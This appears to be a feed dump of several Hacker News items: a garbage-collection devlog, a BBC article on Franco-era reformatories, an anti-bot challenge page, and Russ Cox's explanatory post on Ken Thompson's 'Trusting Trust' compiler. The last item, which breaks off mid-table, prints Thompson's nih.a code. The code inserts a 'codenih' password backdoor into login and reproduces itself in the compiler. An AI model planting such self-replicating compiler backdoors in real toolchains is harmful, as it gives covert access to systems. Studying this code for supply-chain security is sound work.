  &lt;main&gt;&lt;head rend="h1"&gt;devlog: garbage collection is useful&lt;/head&gt;November 14, 2025&lt;p&gt;A long time ago, I spent a few years working on garbage collection in the J9 Java VM.1 And even though I’ve since done mostly done higher-level stuff, having a deeper knowledge of GC has continued to come in useful.&lt;/p&gt;&lt;p&gt;Yesterday, it was an insight from one of my favourite GC papers, A Unified Theory of Garbage Collection, which helped me solve a tricky problem.&lt;/p&gt;&lt;head rend="h2"&gt;ohm’s incremental parsing&lt;/head&gt;&lt;p&gt;I’m working with a team that’s using Ohm to parse text documents and render a rich text version in ProseMirror. The goal is bidirectional updates: changes in ProseMirror should propagate to the text version, and vice versa.&lt;/p&gt;&lt;p&gt;Ohm supports incremental parsing, which means that if you parse some text and then make a small edit, it can quickly reparse by reusing portions of the previous result.&lt;/p&gt;&lt;p&gt;It also supports limited form of incremental transforms. You can define an attribute, which is kind of like a memoized visitor, and the attribute value for a given node will only need to be recalculated if the edit affected one of its subtrees. So you can easily implement a form of persistent data structure, where each new value (e.g., an AST) shares a bunch of structure with the previous one.&lt;/p&gt;&lt;head rend="h2"&gt;the problem&lt;/head&gt;&lt;p&gt;Using this machinery, I tried making an &lt;code&gt;pmNodes&lt;/code&gt; attribute that produced a ProseMirror document for a given input. When the text document is edited, it produces a new tree which shares a bunch of nodes with the previous one.&lt;/p&gt;&lt;p&gt;Then, my plan was to construct a ProseMirror transaction that would turn the old tree into the new one. To do that, it’s helpful to know which nodes appeared in the old document, but not the new one.&lt;/p&gt;&lt;p&gt;My first implementation of this was equivalent to tracing garbage collection â after each edit, I walked the entire document, and recorded all the nodes in a Set. The difference between the sets told me which nodes had died.&lt;/p&gt;&lt;p&gt;But this kind of defeats the purpose of incrementality â if you have a long document and make a small edit, we should be able to process without visiting every node in the document.&lt;/p&gt;&lt;head rend="h2"&gt;the solution&lt;/head&gt;&lt;p&gt;Then I remembered A Unified Theory of Garbage Collection, a 2004 OOPSLA paper by some former colleagues of mine:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Tracing and reference counting are uniformly viewed as being fundamentally different approaches to garbage collection that possess very distinct performance properties. We have implemented high-performance collectors of both types, and in the process observed that the more we optimized them, the more similarly they behaved â that they seem to share some deep structure.&lt;/p&gt;&lt;p&gt;We present a formulation of the two algorithms that shows that they are in fact duals of each other. Intuitively, the difference is that tracing operates on live objects, or “matter”, while reference counting operates on dead objects, or “anti-matter”. For every operation performed by the tracing collector, there is a precisely corresponding anti-operation performed by the reference counting collector.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;This was the answer I needed! Rather than visiting all the live objects, I wanted to only visit the dead ones, and reference counting would let me do that.&lt;/p&gt;&lt;p&gt;So I added a way of maintaining a reference count for all the nodes in the doc. When we produce a new document, we decrement the reference count of the old root node (it will always be 0 afterwards). So we recursively decrement the ref count of its children, and so on. This gives me exactly what I wanted â a way to find all the nodes that were not reused, without having to visit most of the nodes in the doc.&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;&lt;p&gt;I wrote about some of these experiences in Memories of some fantastic internships. ↩&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45944969</guid><pubDate>Sun, 16 Nov 2025 13:25:32 +0000</pubDate></item><item><title>A new documentary about the history of forced psychiatric treatment in Spain</title><link>https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</link><description>&lt;doc fingerprint="fe128901f9b40093"&gt;
  &lt;main&gt;
    &lt;p&gt;My mum was a 17-year-old free spirit - so she was locked up and put in a coma&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Published&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Marina Freixa always knew there was something dark and unspoken about her family.&lt;/p&gt;
    &lt;p&gt;Her mother had grown up under Spain's decades-long dictatorship, which ended in 1975, but the details of her childhood were hazy.&lt;/p&gt;
    &lt;p&gt;Then everything changed one Christmas a decade ago - when Marina was about 20.&lt;/p&gt;
    &lt;p&gt;That winter's evening around the table, with a cloud of cigarette smoke suspended in the air and wine glasses drained, Marina's mother, Mariona Roca Tort, began to speak.&lt;/p&gt;
    &lt;p&gt;"My parents reported me to the authorities," Mariona told them. "They put me in a reformatory when I was 17."&lt;/p&gt;
    &lt;p&gt;Reformatories were institutions where girls and young women who refused to conform to the Franco regime's Catholic values were detained - single mothers, girls with boyfriends, lesbians. Girls who'd been sexually assaulted were incarcerated, assuming the blame for their own abuse. Orphans and abandoned girls might also find themselves living behind convent walls.&lt;/p&gt;
    &lt;p&gt;Marina and her cousins were stunned.&lt;/p&gt;
    &lt;p&gt;They couldn't comprehend that their grandparents had arranged to have their own daughter locked up.&lt;/p&gt;
    &lt;p&gt;Mariona's memory of telling this story to the youngsters in her family is blurred, she believes as a result of the psychiatric "treatment" she was forced to undergo at the reformatory. But Marina didn't forget the revelations, and years later, she would make a documentary telling her mother's story.&lt;/p&gt;
    &lt;p&gt;Mariona is a survivor of the Patronato de ProtecciÃ³n a la Mujer - the Women's Protection Board. Under dictator Francisco Franco, it oversaw a nationwide network of residential institutions managed by religious organisations. There's no definitive information about how many institutions were involved or how many girls were affected.&lt;/p&gt;
    &lt;p&gt;Thursday will mark 50 years since Franco's death. Spain has since seen a revolution in women's rights - but survivors of the Patronato are still waiting for answers and are now demanding an inquiry.&lt;/p&gt;
    &lt;p&gt;Warning: This article contains content that some readers might find distressing&lt;/p&gt;
    &lt;p&gt;Mariona, the oldest of nine siblings, describes her parents as right-wing and ultra-Catholic. They were so conservative they wouldn't even let Mariona wear trousers.&lt;/p&gt;
    &lt;p&gt;But in 1968, when she turned 16, a new world unfolded.&lt;/p&gt;
    &lt;p&gt;Mariona was tutoring children during the day, and preparing for university at evening classes. There, she says, she met people she'd never encountered before - trade unionists, left-wingers and anti-Franco activists. It was the year of global protests against authoritarianism and the Vietnam War, with mass demands for civil rights. The spirit of revolt was infectious.&lt;/p&gt;
    &lt;p&gt;Franco had been in power for three decades. Political parties were banned, censorship was universal and young people wanted change. Soon, Mariona joined her new friends on "raids": a few of them would block off a street, throw Molotov cocktails, hand out leaflets, and when the police turned up, scatter in every direction.&lt;/p&gt;
    &lt;p&gt;On May Day 1969, one of Mariona's friends was arrested at a demonstration in Barcelona. There was a risk the detainee would give names to the police - so Mariona couldn't go home, in case they came looking for her. That night she stayed in the flat of a fellow activist.&lt;/p&gt;
    &lt;p&gt;Returning home the next day, Mariona was in deep trouble. Her parents were furious, and began to exert far more control over her life.&lt;/p&gt;
    &lt;p&gt;"For them, it was a scandal, a stain on the family," she says. "After that, they wouldn't let me out."&lt;/p&gt;
    &lt;p&gt;By the end of that summer, Mariona had resolved to leave home, and travelled to the holiday island of Menorca with some college friends, leaving her parents a note.&lt;/p&gt;
    &lt;p&gt;They immediately reported her as an underage runaway to the authorities, and the moment Mariona was about to board a boat back to Barcelona, she was arrested.&lt;/p&gt;
    &lt;p&gt;At the port in Barcelona her parents met her.&lt;/p&gt;
    &lt;p&gt;They didn't take her home. Instead, they took her to a convent. Mariona wasn't given any explanation - she only remembers her parents' rage.&lt;/p&gt;
    &lt;p&gt;Days later she flew to Madrid with her father. There, she was driven directly to another convent, part of the Patronato system, under Spain's Ministry of Justice.&lt;/p&gt;
    &lt;p&gt;She and the other interned women were categorised and segregated.&lt;/p&gt;
    &lt;p&gt;Mariona says she ended up on the first floor - reserved for "the rebellious ones - the ones they considered fallen women".&lt;/p&gt;
    &lt;p&gt;The Patronato had the power to detain any non-conforming woman under 25. They weren't criminals - they were females deemed in need of "re-education". But Mariona never learned the stories of the others she was confined with.&lt;/p&gt;
    &lt;p&gt;"They didn't let us talk. It's quite incredible," she says. "And you wonder, how did they manage it?"&lt;/p&gt;
    &lt;p&gt;The internees were only allowed to exchange simple greetings with each other - a form of control, and a way of preventing "bad" girls influencing others.&lt;/p&gt;
    &lt;p&gt;"What you couldn't do was really get to know another girl," says Mariona. "Because then they'd separate you - send one of you to a different dormitory, or even to another institution."&lt;/p&gt;
    &lt;p&gt;She thinks there were around 100 internees at the convent. They slept 20 to a room, with a nun at one end, and the door locked. The daily routine was gruelling - prayers, Mass, cleaning the convent, and then hours in a workshop making clothes for local retailers. While the girls sewed, a nun read aloud so that no-one talked.&lt;/p&gt;
    &lt;p&gt;"There was indoctrination," recalls Mariona. "So that you should understand you'd behaved very badly. Then once you realised this, you'd ask for forgiveness and confess."&lt;/p&gt;
    &lt;p&gt;Mariona never confessed.&lt;/p&gt;
    &lt;p&gt;After around four months, she was allowed to return home to Barcelona for Christmas, but wasn't permitted to go out alone. Somehow - and Mariona doesn't remember how - she managed to escape, but her escape was short lived. Within hours she was bundled into a car with her father and an uncle, and driven back to Madrid.&lt;/p&gt;
    &lt;p&gt;"We arrived back at the convent at dusk," she recalls. "I refused to go in. They pulled me up the stairs and gave me a sedative to get me inside."&lt;/p&gt;
    &lt;p&gt;Inside the convent, the other young women were warned against talking to her - the rebel girl who had the nerve to try to run away. She grew intensely lonely, and eventually began refusing food.&lt;/p&gt;
    &lt;p&gt;Dramatic weight loss resulted in her admission to a psychiatric clinic. There, she says she was given two sessions of electric shock treatment, followed by what was called "insulin coma therapy".&lt;/p&gt;
    &lt;p&gt;Mariona says she was injected with insulin to induce deep hypoglycemia - a coma-like state caused by low blood sugar. It was believed this could reduce psychotic or schizophrenic symptoms, and somehow "re-set" a patient's brain.&lt;/p&gt;
    &lt;p&gt;It was a "therapy" that was being discontinued in many countries for one simple reason: it could be lethal.&lt;/p&gt;
    &lt;p&gt;Mariona received an insulin injection in the mornings. Later she'd be brought out of the coma and made to eat. Mentally, she began to shut down.&lt;/p&gt;
    &lt;p&gt;"Everyday, I was more dazed. I started saying things like, 'I hurt my parents,'" she says.&lt;/p&gt;
    &lt;p&gt;"I entered this process of submission and acceptance."&lt;/p&gt;
    &lt;p&gt;Mariona believes the forced, intravenous "treatment" with insulin irreparably damaged her memory. Suspecting it was causing her to forget things, she began keeping a diary. More than five decades later, this faded, paper document from 1971 would inform Marina's documentary about her mother's experience.&lt;/p&gt;
    &lt;p&gt;Doctors believed the "treatment" would help Mariona gain weight - but that wasn't happening.&lt;/p&gt;
    &lt;p&gt;"One day, the psychiatrist decided it was better to try tying me to the bed until I ate."&lt;/p&gt;
    &lt;p&gt;Mariona's despair became so unbearable, she says she thought about taking her own life. Then the psychiatrist gave her a target weight of 40kg (6st 4lb). If she achieved that, they promised she'd be released from the clinic.&lt;/p&gt;
    &lt;p&gt;Mariona succeeded. In 1972, once she'd grown a little stronger, she returned to Barcelona.&lt;/p&gt;
    &lt;p&gt;Now aged 20, she vowed to never live with her parents again.&lt;/p&gt;
    &lt;p&gt;These were the final years of Franco's dictatorship before his death in 1975. Mariona moved from job to job, eventually forging a career as a TV director. She had children of her own, but her relationship with her parents remained cool.&lt;/p&gt;
    &lt;p&gt;At some point, Mariona asked her mother why she'd been sent to the Patronato. Her mother only said: "We made a mistake."&lt;/p&gt;
    &lt;p&gt;Mariona's father is in his 90s now.&lt;/p&gt;
    &lt;p&gt;"We suffered a lot too," he told her when she asked him about the family decision to have her locked up in Madrid.&lt;/p&gt;
    &lt;p&gt;For Marina, learning more about her mother's story has complicated her relationship with her grandfather.&lt;/p&gt;
    &lt;p&gt;"I can't force myself to love someone who's caused so much pain - who treated my mother very badly."&lt;/p&gt;
    &lt;p&gt;The short documentary Marina produced about her mother's experience of the Patronato is called Els Buits - Catalan for "the spaces" - a reference to the blanks in Mariona's memory. The film has won prizes in Spain, and was nominated for a prestigious Goya Award.&lt;/p&gt;
    &lt;p&gt;Fifty years after the death of Franco, the film has contributed to a groundswell of calls for the interned women to be formally recognised under the law as victims of Spain's dictatorship. Spain's Minister for Democratic Memory, Ãngel VÃctor Torres, said his government was open to looking at the case of the Patronato survivors.&lt;/p&gt;
    &lt;p&gt;Meanwhile, Marina and Mariona are on tour with the film, taking it to community screenings.&lt;/p&gt;
    &lt;p&gt;"Women come and tell their stories â it's like a door opened to something unknown, and that's very powerful," says Marina. "People think what happened in their own home was an isolated incident. We try to say: this history isn't individual, it was systematic."&lt;/p&gt;
    &lt;p&gt;Her mother Mariona still doubts her memory sometimes.&lt;/p&gt;
    &lt;p&gt;But, she says, "seeing it all reflected in the film, that gives it the weight of truth."&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;If you've been affected by issues involving suicide or feelings of despair, details of organisations offering advice and support for people in the UK are available from BBC Action Line. Help and support outside the UK can be found at Befrienders Worldwide, external.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Related topics&lt;/head&gt;
    &lt;head rend="h2"&gt;More weekend picks&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published29 June 2024&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published27 October 2024&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published19 April&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945101</guid><pubDate>Sun, 16 Nov 2025 13:44:20 +0000</pubDate></item><item><title>Production-Grade Container Deployment with Podman Quadlets – Larvitz Blog</title><link>https://blog.hofstede.it/production-grade-container-deployment-with-podman-quadlets/index.html</link><description>&lt;doc fingerprint="5e8f767c1c2747ac"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Making sure you're not a bot!&lt;/head&gt;
    &lt;p&gt;Loading...&lt;/p&gt;
    &lt;p&gt;You are seeing this because the administrator of this website has set up Anubis to protect the server against the scourge of AI companies aggressively scraping websites. This can and does cause downtime for the websites, which makes their resources inaccessible for everyone.&lt;/p&gt;
    &lt;p&gt;Anubis is a compromise. Anubis uses a Proof-of-Work scheme in the vein of Hashcash, a proposed proof-of-work scheme for reducing email spam. The idea is that at individual scales the additional load is ignorable, but at mass scraper levels it adds up and makes scraping much more expensive.&lt;/p&gt;
    &lt;p&gt;Ultimately, this is a placeholder solution so that more time can be spent on fingerprinting and identifying headless browsers (EG: via how they do font rendering) so that the challenge proof of work page doesn't need to be presented to users that are much more likely to be legitimate.&lt;/p&gt;
    &lt;p&gt;Please note that Anubis requires the use of modern JavaScript features that plugins like JShelter will disable. Please disable JShelter or other such plugins for this domain.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945200</guid><pubDate>Sun, 16 Nov 2025 13:59:05 +0000</pubDate></item><item><title>Running the "Reflections on Trusting Trust" Compiler (2023)</title><link>https://research.swtch.com/nih</link><description>&lt;doc fingerprint="26c09b19bfbb2d04"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Running the “Reflections on Trusting Trust” Compiler Posted on Wednesday, October 25, 2023. &lt;/head&gt;
    &lt;p&gt;Supply chain security is a hot topic today, but it is a very old problem. In October 1983, 40 years ago this week, Ken Thompson chose supply chain security as the topic for his Turing award lecture, although the specific term wasn’t used back then. (The field of computer science was still young and small enough that the ACM conference where Ken spoke was the “Annual Conference on Computers.”) Ken’s lecture was later published in Communications of the ACM under the title “Reflections on Trusting Trust.” It is a classic paper, and a short one (3 pages); if you haven’t read it yet, you should. This post will still be here when you get back.&lt;/p&gt;
    &lt;p&gt;In the lecture, Ken explains in three steps how to modify a C compiler binary to insert a backdoor when compiling the “login” program, leaving no trace in the source code. In this post, we will run the backdoored compiler using Ken’s actual code. But first, a brief summary of the important parts of the lecture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 1: Write a Self-Reproducing Program&lt;/head&gt;
    &lt;p&gt;Step 1 is to write a program that prints its own source code. Although the technique was not widely known in 1975, such a program is now known in computing as a “quine,” popularized by Douglas Hofstadter in Gödel, Escher, Bach. Here is a Python quine, from this collection:&lt;/p&gt;
    &lt;code&gt;
s=’s=%r;print(s%%s)’;print(s%s)
&lt;/code&gt;
    &lt;p&gt;And here is a slightly less cryptic Go quine:&lt;/p&gt;
    &lt;code&gt;
package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `
&lt;/code&gt;
    &lt;p&gt;The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder. In the Python version, the placeholder is &lt;code&gt;%r&lt;/code&gt;;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “Zip Files All The Way Down,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 2: Compilers Learn&lt;/head&gt;
    &lt;p&gt;Step 2 is to notice that when a compiler compiles itself, there can be important details that persist only in the compiler binary, not in the actual source code. Ken gives the example of the numeric values of escape sequences in C strings. You can imagine a compiler containing code like this during the processing of escaped string literals:&lt;/p&gt;
    &lt;quote&gt;c = next(); if(c == '\\') { c = next(); if(c == 'n') c = '\n'; }&lt;/quote&gt;
    &lt;p&gt; That code is responsible for processing the two character sequence &lt;code&gt;\n&lt;/code&gt;
in a string literal
and turning it into a corresponding byte value,
specifically &lt;code&gt;’\n’&lt;/code&gt;.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write &lt;code&gt;c = 10&lt;/code&gt;,
you compile and install the compiler, and then you can change
the code to &lt;code&gt;c = ’\n’&lt;/code&gt;.
The compiler has “learned” the value of &lt;code&gt;’\n’&lt;/code&gt;,
but that value only appears in the compiler binary,
not in the source code.
&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 3: Learn a Backdoor&lt;/head&gt;
    &lt;p&gt; Step 3 is to put these together to help the compiler “learn” to miscompile the target program (&lt;code&gt;login&lt;/code&gt; in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Recognize &lt;code&gt;login&lt;/code&gt;and insert the backdoor.&lt;/item&gt;
      &lt;item&gt;Recognize the compiler itself and insert the code for these two changes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The “insert the code for these two changes” step requires being able to write a self-reproducing program: the code must reproduce itself into the new compiler binary. At this point, the compiler binary has “learned” the miscompilation steps, and the clean source code can be restored.&lt;/p&gt;
    &lt;head rend="h2"&gt;Running the Code&lt;/head&gt;
    &lt;p&gt;At the Southern California Linux Expo in March 2023, Ken gave the closing keynote, a delightful talk about his 75-year effort accumulating what must be the world’s largest privately held digital music collection, complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins). During the Q&amp;amp;A session, someone jokingly asked about the Turing award lecture, specifically “can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?” Ken replied:&lt;/p&gt;
    &lt;quote&gt;I assume you’re talking about some paper I wrote a long time ago. No, I have no backdoor. That was very carefully controlled, because there were some spectacular fumbles before that. I got it released, or I got somebody to steal it from me, in a very controlled sense, and then tracked whether they found it or not. And they didn’t. But they broke it, because of some technical effect, but they didn’t find out what it was and then track it. So it never got out, if that’s what you’re talking about. I hate to say this in front of a big audience, but the one question I’ve been waiting for since I wrote that paper is “you got the code?” Never been asked. I still have the code.&lt;/quote&gt;
    &lt;p&gt;Who could resist that invitation!? Immediately after watching the video on YouTube in September 2023, I emailed Ken and asked him for the code. Despite my being six months late, he said I was the first person to ask and mailed back an attachment called &lt;code&gt;nih.a&lt;/code&gt;,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, &lt;code&gt;.a&lt;/code&gt; files are archives containing
compiler object files,
but this one contains two source files.&lt;/p&gt;
    &lt;p&gt; The code applies cleanly to the C compiler from the Research Unix Sixth Edition (V6). I’ve posted an online emulator that runs V6 Unix programs and populated it with some old files from Ken and Dennis, including &lt;code&gt;nih.a&lt;/code&gt;.
Let’s actually run the code.
You can follow along in the simulator.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Login as &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;login: ken Password: ken % who ken tty8 Aug 14 22:06 %&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Change to and list the &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% chdir nih % ls nih.a&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Extract &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ar xv nih.a x x.c x rc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat x.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Declare the global variable &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;nihflg;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Define the function &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;codenih() { char *p,*s; int i;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(pflag) return;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Skip leading tabs in the line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=line; while(*p=='\t') p++;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Look for the line&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;s="namep = crypt(pwbuf);"; for(i=0;i&amp;lt;21;i++) if(s[i]!=p[i]) goto l1;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Define &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="for(c=0;c&amp;lt;8;c++)" "if(\"codenih\"[c]!=pwbuf[c])goto x1x;" "while(*namep)namep++;" "while(*np!=':')np++;x1x:";&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;With the &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;for(i=0;;i++) if(!(*p++=s[i])) break; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;No match for &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l1: s="av[4] = \"-P\";"; for(i=0;i&amp;lt;13;i++) if(s[i]!=p[i]) goto l2;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Increment &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;nihflg++; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Next target: input reading loop in &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l2: if(nihflg!=1) goto l3; s="while(getline()) {"; for(i=0;i&amp;lt;18;i++) if(s[i]!=p[i]) goto l3;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Append input-reading backdoor: call &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="codenih();"; for(i=0;;i++) if(!(*p++=s[i])) break; nihflg++; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Next target: flushing output in &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l3: if(nihflg!=2) goto l4; s="fflush(obuf);"; for(i=0;i&amp;lt;13;i++) if(s[i]!=p[i]) goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Insert end-of-file backdoor: call &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="repronih();"; for(i=0;;i++) if(!(*p++=s[i])) break; nihflg++; l4:; }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Here the magic begins, as presented in the&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;char nihstr[] { %0 };&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The magic continues.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;repronih() { int i,n,c;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;If &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(nihflg!=3) return;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;p&gt;The most cryptic part of the whole program.&lt;/p&gt;&lt;code&gt;n=0&lt;/code&gt;: emit literal text before “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=1&lt;/code&gt;: emit octal bytes of text before “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=2&lt;/code&gt;: emit octal bytes of “&lt;code&gt;%&lt;/code&gt;” and rest of file&lt;code&gt;n=3&lt;/code&gt;: no output, looking for “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=4&lt;/code&gt;: emit literal text after “&lt;code&gt;%&lt;/code&gt;”&lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;n=0; i=0; for(;;) switch(c=nihstr[i++]){&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;quote&gt;case 045: n++; if(n==1) i=0; if(n!=2) continue;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;In phases 1 and 2, emit octal byte value&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;default: if(n==1||n==2){ putc('0',obuf); if(c&amp;gt;=0100) putc((c&amp;gt;&amp;gt;6)+'0',obuf); if(c&amp;gt;=010) putc(((c&amp;gt;&amp;gt;3)&amp;amp;7)+'0',obuf); putc((c&amp;amp;7)+'0',obuf); putc(',',obuf); putc('\n',obuf); continue; }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;In phases 0 and 4, emit literal byte value,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(n!=3) putc(c,obuf); continue;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Reaching end of &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;case 0: n++; i=0; if(n==5){ fflush(obuf); return; } } }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Now let’s read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat rc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Start the editor &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;ed x.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Delete all tabs from every line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/ //g&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write the modified file to &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
